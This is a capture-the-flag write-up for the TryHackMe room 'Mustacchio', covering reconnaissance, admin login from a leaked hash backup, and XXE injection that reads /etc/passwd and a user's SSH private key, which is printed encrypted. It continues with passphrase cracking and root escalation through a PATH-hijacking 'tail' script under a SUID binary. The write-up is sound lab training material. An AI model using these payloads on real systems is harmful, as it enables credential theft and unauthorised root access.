---
title: "TryHackMe - Mustachio"
date: 2025-11-23
categories: [Capture The Flags, TryHackMe]
tags: [CTF, Writeups, Privilege Escalation]
---

![Challenge picture](/assets/img/tryHackMe/mustachio/mustachio.png)

*Room link: https://tryhackme.com/room/mustacchio*

The passwords and flags have been redacted since it is a live room.
---

## 1. Nmap scan

When doing such challenges, I always do types of scan: one would be port scan+version detection+OS detection+nmap script scan and second would be all ports scan because -A flag does not scan all ports

```bash
~ ❯ nmap -A -T4 10.48.166.117            
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-23 19:15 IST
Nmap scan report for 10.48.166.117
Host is up (0.095s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 58:1b:0c:0f:fa:cf:05:be:4c:c0:7a:f1:f1:88:61:1c (RSA)
|   256 3c:fc:e8:a3:7e:03:9a:30:2c:77:e0:0a:1c:e4:52:e6 (ECDSA)
|_  256 9d:59:c6:c7:79:c5:54:c4:1d:aa:e4:d1:84:71:01:92 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Mustacchio | Home
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Apache/2.4.18 (Ubuntu)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|phone|switch
Running (JUST GUESSING): Linux 4.X|2.6.X|3.X|5.X (97%), Google Android 8.X (91%), FS embedded (87%)
OS CPE: cpe:/o:linux:linux_kernel:4.4 cpe:/o:google:android:8 cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:5.4 cpe:/h:fs:s5850
Aggressive OS guesses: Linux 4.4 (97%), Linux 4.15 (91%), Android 8 - 9 (Linux 3.18 - 4.4) (91%), Linux 2.6.32 - 3.13 (91%), Linux 3.10 - 4.11 (91%), Linux 3.13 - 4.4 (91%), Linux 3.2 - 4.14 (91%), Linux 3.8 - 3.16 (91%), Linux 2.6.32 - 3.10 (91%), Linux 3.10 - 3.13 (90%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 3 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 22/tcp)
HOP RTT       ADDRESS
1   109.50 ms 192.168.128.1
2   ...
3   109.55 ms 10.48.166.117

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 27.48 seconds
```

```bash
~ ❯ nmap -p- 10.48.166.117               
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-23 19:15 IST
Nmap scan report for 10.48.166.117
Host is up (0.088s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8765/tcp open  ultraseek-http

Nmap done: 1 IP address (1 host up) scanned in 255.93 seconds
```

In the first scan there is a web page available on port 80

![web page](/assets/img/tryHackMe/mustachio/homePage.png)

I went through the web page, robots.txt, source code but nothing useful was there so I moved to fuzzing

```bash
~ ❯ ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u "http://10.48.166.117/FUZZ" -recursion -recursion-depth 1

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.48.166.117/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

#                       [Status: 200, Size: 1752, Words: 77, Lines: 73, Duration: 129ms]
# This work is licensed under the Creative Commons [Status: 200, Size: 1752, Words: 77, Lines: 73, Duration: 129ms]
# Copyright 2007 James Fisher [Status: 200, Size: 1752, Words: 77, Lines: 73, Duration: 129ms]
# directory-list-2.3-small.txt [Status: 200, Size: 1752, Words: 77, Lines: 73, Duration: 129ms]
#                       [Status: 200, Size: 1752, Words: 77, Lines: 73, Duration: 129ms]
# Attribution-Share Alike 3.0 License. To view a copy of this [Status: 200, Size: 1752, Words: 77, Lines: 73, Duration: 124ms]
# license, visit http://creativecommons.org/licenses/by-sa/3.0/ [Status: 200, Size: 1752, Words: 77, Lines: 73, Duration: 3614ms]
# or send a letter to Creative Commons, 171 Second Street, [Status: 200, Size: 1752, Words: 77, Lines: 73, Duration: 3615ms]
images                  [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 3624ms]
[INFO] Adding a new job to the queue: http://10.48.166.117/images/FUZZ

#                       [Status: 200, Size: 1752, Words: 77, Lines: 73, Duration: 4622ms]
# on at least 3 different hosts [Status: 200, Size: 1752, Words: 77, Lines: 73, Duration: 4621ms]
# Priority-ordered case-sensitive list, where entries were found [Status: 200, Size: 1752, Words: 77, Lines: 73, Duration: 4632ms]
                        [Status: 200, Size: 1752, Words: 77, Lines: 73, Duration: 4632ms]
#                       [Status: 200, Size: 1752, Words: 77, Lines: 73, Duration: 4632ms]
# Suite 300, San Francisco, California, 94105, USA. [Status: 200, Size: 1752, Words: 77, Lines: 73, Duration: 4633ms]
custom                  [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 104ms]
[INFO] Adding a new job to the queue: http://10.48.166.117/custom/FUZZ

fonts                   [Status: 301, Size: 314, Words: 20, Lines: 10, Duration: 105ms]
[INFO] Adding a new job to the queue: http://10.48.166.117/fonts/FUZZ
```

While ffuf was going on, I noticed the 2nd nmap scan and there's a port, 8765, which is open hosting a web page. I went there and yeah that's why you always do a full port scan- there was the admin page!

![admin page](/assets/img/tryHackMe/mustachio/adminPanel.png)

I tried default passwords, basic sql injection payloads but none were successful. 

---

## 2. Admin panel access

From the fuzzing I got this endpoint `/custom`. After going there I found a users.bak file which I then downloaded

![source code](/assets/img/tryHackMe/mustachio/sourceCode.png)

```bash
~/Downloads ❯ file users.bak                                                              
users.bak: SQLite 3.x database, last written using SQLite version 3034001, file counter 2, database pages 2, cookie 0x1, schema 4, UTF-8, version-valid-for 2
~/Downloads ❯ strings users.bak                                                                    
SQLite format 3
tableusersusers
CREATE TABLE users(username text NOT NULL, password text NOT NULL)
]admin1868e36a6d2b17d4c2745f1659433a54d4bc5f4b
```

hah, got the username and password. For cracking the password's hash I used `hashes.com` and it cracked it in no time!

![hash crack](/assets/img/tryHackMe/mustachio/hash.png)

The password for admin is: b[REDACTED]9

![admin homePage](/assets/img/tryHackMe/mustachio/adminPage.png)

There's an input box for adding comment to the website. I tried sql injection, SSTI but again nothing worked. I then moved ahead to check the source code for this page

![source code](/assets/img/tryHackMe/mustachio/sourceCode.png)

Found some interesting sutff in the source page. There is a user called Barry and he can ssh via his private key, but I don't have the private key yet

Second interesting there was this route `/auth/dontforget.bak`. I downloaded this file and got the following

```
<?xml version="1.0" encoding="UTF-8"?>                                            
<comment>                                                                         
  <name>Joe Hamd</name>                                                           
  <author>Barry Clad</author>                                                     
  <com>his paragraph was a waste of time and space. If you had not read this and I had not typed this you and I could’ve done something more productive than reading
 this mindlessly and carelessly as if you did not have anything else to do in life. Life is so precious because it is short and you are being so careless that you d
o not realize it until now since this void paragraph mentions that you are doing something so mindless, so stupid, so careless that you realize that you are not usi
ng your time wisely. You could’ve been playing with your dog, or eating your cat, but no. You want to read this barren paragraph and expect something marvelous and 
terrific at the end. But since you still do not realize that you are wasting precious time, you still continue to read the null paragraph. If you had not noticed, y
ou have wasted an estimated time of 20 seconds.</com>
</comment>
```

---

## 3. XXE Injection

I copy pasted the above xml into the input box on the admin page and the same was reflected back and that's give me the idea to go for XXE injection.

I used burpsuite for intercepting requests and to see the response.

![burpsuite](/assets/img/tryHackMe/mustachio/burp.png)

The xml was url encoded as can be seen in the image attached. I went ahead to search for XXE Injection payloads online and accordingly modified the xml code to first read the /etc/passwd file


```xml
xml=<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
   <!ELEMENT foo ANY >
   <!ENTITY xxe SYSTEM  "file:///etc/passwd" >]>
<comment>
  <name>Joe Hamd</name>
  <author>Barry Clad</author>
  <com>&xxe;</com>
</comment>
```

I url-encoded this, sent the request and yeah! got it! I could see the /etc/passwd file in the comment section

![payload 1](/assets/img/tryHackMe/mustachio/payload1.png)

Since barry could ssh via his key, my next step was to read the said key. In linux systems, private key is stored in in `/home/<username>/.ssh/id_rsa` usually so I changed the path to that in the above payload and sent the request

![private key](/assets/img/tryHackMe/mustachio/ssh_key.png)

and there I have it! but it's encrypted

```
 -----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,D137279D69A43E71BB7FCB87FC61D25E

jqDJP+blUr+xMlASYB9t4gFyMl9VugHQJAylGZE6J/b1nG57eGYOM8wdZvVMGrfN
bNJVZXj6VluZMr9uEX8Y4vC2bt2KCBiFg224B61z4XJoiWQ35G/bXs1ZGxXoNIMU
MZdJ7DH1k226qQMtm4q96MZKEQ5ZFa032SohtfDPsoim/7dNapEOujRmw+ruBE65
l2f9wZCfDaEZvxCSyQFDJjBXm07mqfSJ3d59dwhrG9duruu1/alUUvI/jM8bOS2D
Wfyf3nkYXWyD4SPCSTKcy4U9YW26LG7KMFLcWcG0D3l6l1DwyeUBZmc8UAuQFH7E
NsNswVykkr3gswl2BMTqGz1bw/1gOdCj3Byc1LJ6mRWXfD3HSmWcc/8bHfdvVSgQ
ul7A8ROlzvri7/WHlcIA1SfcrFaUj8vfXi53fip9gBbLf6syOo0zDJ4Vvw3ycOie
TH6b6mGFexRiSaE/u3r54vZzL0KHgXtapzb4gDl/yQJo3wqD1FfY7AC12eUc9NdC
rcvG8XcDg+oBQokDnGVSnGmmvmPxIsVTT3027ykzwei3WVlagMBCOO/ekoYeNWlX
bhl1qTtQ6uC1kHjyTHUKNZVB78eDSankoERLyfcda49k/exHZYTmmKKcdjNQ+KNk
4cpvlG9Qp5Fh7uFCDWohE/qELpRKZ4/k6HiA4FS13D59JlvLCKQ6IwOfIRnstYB8
7+YoMkPWHvKjmS/vMX+elcZcvh47KNdNl4kQx65BSTmrUSK8GgGnqIJu2/G1fBk+
T+gWceS51WrxIJuimmjwuFD3S2XZaVXJSdK7ivD3E8KfWjgMx0zXFu4McnCfAWki
ahYmead6WiWHtM98G/hQ6K6yPDO7GDh7BZuMgpND/LbS+vpBPRzXotClXH6Q99I7
LIuQCN5hCb8ZHFD06A+F2aZNpg0G7FsyTwTnACtZLZ61GdxhNi+3tjOVDGQkPVUs
pkh9gqv5+mdZ6LVEqQ31eW2zdtCUfUu4WSzr+AndHPa2lqt90P+wH2iSd4bMSsxg
laXPXdcVJxmwTs+Kl56fRomKD9YdPtD4Uvyr53Ch7CiiJNsFJg4lY2s7WiAlxx9o
vpJLGMtpzhg8AXJFVAtwaRAFPxn54y1FITXX6tivk62yDRjPsXfzwbMNsvGFgvQK
DZkaeK+bBjXrmuqD4EB9K540RuO6d7kiwKNnTVgTspWlVCebMfLIi76SKtxLVpnF
6aak2iJkMIQ9I0bukDOLXMOAoEamlKJT5g+wZCC5aUI6cZG0Mv0XKbSX2DTmhyUF
ckQU/dcZcx9UXoIFhx7DesqroBTR6fEBlqsn7OPlSFj0lAHHCgIsxPawmlvSm3bs
7bdofhlZBjXYdIlZgBAqdq5jBJU8GtFcGyph9cb3f+C3nkmeDZJGRJwxUYeUS9Of
1dVkfWUhH2x9apWRV8pJM/ByDd0kNWa/c//MrGM0+DKkHoAZKfDl3sC0gdRB7kUQ
+Z87nFImxw95dxVvoZXZvoMSb7Ovf27AUhUeeU8ctWselKRmPw56+xhObBoAbRIn
7mxN/N5LlosTefJnlhdIhIDTDMsEwjACA+q686+bREd+drajgk6R9eKgSME7geVD
-----END RSA PRIVATE KEY-----
```

---

## 4. Cracking the ssh key and getting access

To get the passpharse for the private key I used `john the ripper` tool. First step was to generate the hash of this key and then run john on this hash to get the passphrase.

```bash
~/Downloads ❯ nano id_rsa                          
~/Downloads ❯ /usr/share/john/ssh2john.py id_rsa > hash
~/Downloads ❯ john --wordlist=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
u[REDACTED]s       (id_rsa)     
1g 0:00:00:00 DONE (2025-11-23 20:01) 1.408g/s 4183Kp/s 4183Kc/s 4183KC/s urieljr.k..urielandrea
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
~/Downloads ❯ 
```

easy, the passphrase is `u[REDACTED]s`. I set the permission for the private key and ssh into the barry account using it

```bash
~/Downloads ❯ chmod 600 id_rsa
~/Downloads ❯ ssh -i id_rsa barry@10.48.166.117
Enter passphrase for key 'id_rsa': 
Welcome to Ubuntu 16.04.7 LTS (GNU/Linux 4.4.0-210-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

34 packages can be updated.
16 of these updates are security updates.
To see these additional updates run: apt list --upgradable



The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

barry@mustacchio:~$ id
uid=1003(barry) gid=1003(barry) groups=1003(barry)
barry@mustacchio:~$ 
```

---

## 5. User flag

User flag in CTFs is usually stored in the user directory so it was a one click thing

```bash
barry@mustacchio:~$ ls
user.txt
barry@mustacchio:~$ cat user.txt 
6[REDACTED]1
```

---

## 6. Privilege Escalation

My favourite part in linx boot-2-root challenges. Here I usually start with checking the SUID binaries


```bash
barry@mustacchio:~$ find / -perm -u=s -type f 2>/dev/null
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/eject/dmcrypt-get-device
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/snapd/snap-confine
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/bin/passwd
/usr/bin/pkexec
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/at
/usr/bin/chsh
/usr/bin/newgidmap
/usr/bin/sudo
/usr/bin/newuidmap
/usr/bin/gpasswd
/home/joe/live_log
/bin/ping
/bin/ping6
/bin/umount
/bin/mount
/bin/fusermount
/bin/su
barry@mustacchio:~$ ls -la /home/joe/live_log
-rwsr-xr-x 1 root root 16832 Jun 12  2021 /home/joe/live_log
```

If you look closely you'll see this file `home/joe/live_log`. This is the interesting file and the possible entry point to get root access. I went ahead and checked who owns it, what it does, and it's content

```bash
barry@mustacchio:~$ /home/joe/live_log 
192.168.132.2 - - [23/Nov/2025:14:17:38 +0000] "POST /home.php HTTP/1.1" 200 1123 "http://10.48.166.117:8765/home.php" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
192.168.132.2 - - [23/Nov/2025:14:17:58 +0000] "POST /home.php HTTP/1.1" 200 1123 "http://10.48.166.117:8765/home.php" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
192.168.132.2 - - [23/Nov/2025:14:19:02 +0000] "POST /home.php HTTP/1.1" 200 1123 "http://10.48.166.117:8765/home.php" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
192.168.132.2 - - [23/Nov/2025:14:21:20 +0000] "POST /home.php HTTP/1.1" 200 1544 "http://10.48.166.117:8765/home.php" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
192.168.132.2 - - [23/Nov/2025:14:21:37 +0000] "POST /home.php HTTP/1.1" 200 1123 "http://10.48.166.117:8765/home.php" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
192.168.132.2 - - [23/Nov/2025:14:26:21 +0000] "POST /home.php HTTP/1.1" 200 1123 "http://10.48.166.117:8765/home.php" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
192.168.132.2 - - [23/Nov/2025:14:26:36 +0000] "POST /home.php HTTP/1.1" 200 1123 "http://10.48.166.117:8765/home.php" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
192.168.132.2 - - [23/Nov/2025:14:26:55 +0000] "POST /home.php HTTP/1.1" 200 1780 "http://10.48.166.117:8765/home.php" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
192.168.132.2 - - [23/Nov/2025:14:28:05 +0000] "POST /home.php HTTP/1.1" 200 1123 "http://10.48.166.117:8765/home.php" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
192.168.132.2 - - [23/Nov/2025:14:28:56 +0000] "POST /home.php HTTP/1.1" 200 2572 "http://10.48.166.117:8765/home.php" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
```

The content:

```bash
barry@mustacchio:~$ strings /home/joe/live_log 
/lib64/ld-linux-x86-64.so.2
libc.so.6
setuid
printf
system
__cxa_finalize
setgid
__libc_start_main
GLIBC_2.2.5
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
u+UH
[]A\A]A^A_
Live Nginx Log Reader
tail -f /var/log/nginx/access.log
:*3$"
GCC: (Ubuntu 9.3.0-17ubuntu1~20.04) 9.3.0
```
It is owned by root so this is definitely the entry point to get root acces. It is basically using tail command to read the ngninx logs and then printing it but here's the fun part.

Tail is referenced without an absolute path, we can create our own script by that name and insert it higher in the environment PATH so that our script is executed rather than the real tail.

Our script will be executed as root since live_log is calling it, and that is owned by root and has the sticky bit sit in order for it to be able to read the nginx access log (also owned by root).

Let’s create a script named tail inside /tmp and run the live_log again

```bash
barry@mustacchio:~$ cat /tmp/tail
#!/bin/bash

/bin/bash -p

barry@mustacchio:/tmp$ chmod +x tail
barry@mustacchio:/tmp$ export PATH=/tmp:$PATH
```
-p spawns the bash shell with the file's owner permission, which is root!

```bash
barry@mustacchio:~$ id
uid=1003(barry) gid=1003(barry) groups=1003(barry)
barry@mustacchio:~$ /home/joe/live_log 
root@mustacchio:~# id
uid=0(root) gid=0(root) groups=0(root),1003(barry)

root@mustacchio:~# cd /root
root@mustacchio:/root# ls
root.txt
root@mustacchio:/root# cat root.txt 
3[REDACTED]5
```

Hope you enjoyed reading it :)